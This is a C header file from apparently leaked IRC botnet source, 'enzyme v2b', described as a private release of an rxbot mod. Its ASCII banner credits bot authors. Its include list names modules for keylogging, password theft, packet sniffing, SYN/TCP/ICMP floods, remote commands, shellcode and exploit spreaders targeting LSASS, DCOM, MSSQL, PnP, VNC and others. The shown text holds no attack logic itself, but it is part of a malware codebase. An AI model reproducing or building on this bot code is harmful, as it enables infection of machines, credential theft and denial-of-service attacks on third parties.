/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <winioctl.h>
#include <winsvc.h>
#include <fcntl.h>
#include <shlwapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include "defines.h"
#include "ehandler.h"
#include "processes.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "nzm.h"
#include "irc_send.h"
#include "crc32.h"
#include "netutils.h"
#include "sysinfo.h"
#include "advscan.h"
#include "ident.h"
#include "rndnick.h"
#include "socks4.h"
#include "download.h"
#include "scan.h"
#include "ddos.h"
#include "synflood.h"
#include "tcpflood.h"
#include "icmpflood.h"
#include "pingudp.h"
#include "redirect.h"
#include "wildcard.h"
#include "misc.h"
#include "driveinfo.h"
#include "dcc.h"
#include "httpd.h"
#include "crypt.h"
#include "visit.h"
#include "tftpd.h"
#include "cdkeys.h"
#include "remotecmd.h"
#include "aliaslog.h"
#include "psniff.h"
#include "secure.h"
#include "autostart.h"
#include "capture.h"
#include "keylogger.h"
#include "session.h"
#include "findpass.h"
#include "findfile.h"
#include "fphost.h"
#include "shellcode.h"
#include "dcom.h"
#include "lsass.h"
#include "dcass.h"
#include "mssql.h"
#include "ftpd.h"
#include "lsass1lsass.h"
#include "net.h"
#include "wkssvc.h"
#include "clsass.h"
#include "mssqllsass.h"
#include "supersyn.h"
#include "realcast.h"
#include "vncrooter.h"
#include "vncps.h"
#include "netapi.h"
#include "pnp.h"
#include "sym06_010.h"
#include "Asn.h"